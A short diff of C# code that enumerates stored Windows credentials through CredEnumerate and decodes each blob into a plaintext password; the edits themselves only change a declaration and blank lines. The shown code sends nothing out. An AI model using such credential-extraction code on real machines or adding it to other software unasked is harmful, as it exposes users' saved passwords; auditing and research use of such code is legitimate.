@@ -10,7 +10,7 @@
         {
             public static List<object> Run()
             {
-                List<object> credlist = new List<object>();
+                var credlist = new List<object>();
                 int count;
                 IntPtr pCredentials;
                 CredentialUtil.CredEnumerate(null, 0, out count, out pCredentials);
@@ -21,9 +21,7 @@
 
                     if (credential.CredentialBlobSize > 0)
                     {
-                        
                         var password = Marshal.PtrToStringAnsi(credential.CredentialBlob, credential.CredentialBlobSize);
-
                         if (password.Replace("\0", "").Length != credential.CredentialBlobSize)
                             password = Marshal.PtrToStringUni(credential.CredentialBlob, credential.CredentialBlobSize / 2);
 
